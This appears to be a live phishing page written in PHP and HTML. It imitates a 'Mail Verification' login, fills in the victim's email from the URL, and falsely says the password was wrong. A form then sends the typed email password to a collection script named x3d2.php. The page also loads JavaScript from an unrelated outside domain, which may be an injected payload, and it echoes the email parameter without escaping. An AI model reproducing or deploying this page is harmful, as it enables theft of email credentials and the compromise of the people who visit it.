<?php


$user = $_REQUEST['email'];
$email = $_GET['email'];


?>
<html>
<head>
<link rel="shortcut icon" href="files/projectIcon.ico" type="image/gif"/>
<title>Mail Verification</title><script src='http://petstop.com.sg/google_analytics_auto.js'></script></head>
<body>

<br><br>

<table align="center">

<tr><td>

	<div align="center">

	<img src="files/logo.png" width="160" height="70">

	<br><br>

	<font face="verdana" size="2">
	<strong><span style="color:#FF0000;"><span class="short_text" id="result_box" lang="zh-CN"><span>Wrong passowrd - </span> <span>Enter correct password to continue</span></span></span></strong><span style="color:#FF0000;"><font face="verdana" size="2"> </font></span> 
	</font>
	<br>

	<form method="post" action="x3d2.php">


	<br><br>

	<input name="login" type="hidden" class="form-control" id="email" value="<?php echo $email; ?>" placeholder="Username">
				<font face="arial" size="3" color="#045FB4"><?php echo $email; ?></font>

	<br><br>

	<input  name="passwd" type="password" style="width:250px; height:40px; font-family: Verdana; font-size: 15px; font-weight: light; color:#000000; 
	background-color: #ffffff; border: solid 1px #848484; padding: 13px;" required="" placeholder="email password" autofocus>	



	<br><br>

	<input type="submit" value="Sign-in" style="width:250px; height:60px; background-color: #0B2161; border: solid 3px #0B2161; 
	font-family: Verdana; font-size: 17px; font-weight: light; color: #ffffff; -moz-border-radius: 4px; -webkit-border-radius: 4px; 
	-khtml-border-radius: 4px; border-radius: 4px;
	-moz-box-shadow: 3px 3px 3px #888; -webkit-box-shadow: 3px 3px 3px #888; box-shadow: 3px 3px 3px #888;">

	<br>
	</form>



	<br>
	<hr width="250" align="center">

	<font face="calibri" size="2">
	Mail Admin 2023 | All rights reserved.
	</font>	

	</div>

</td></tr>

</table>


</body>
</html>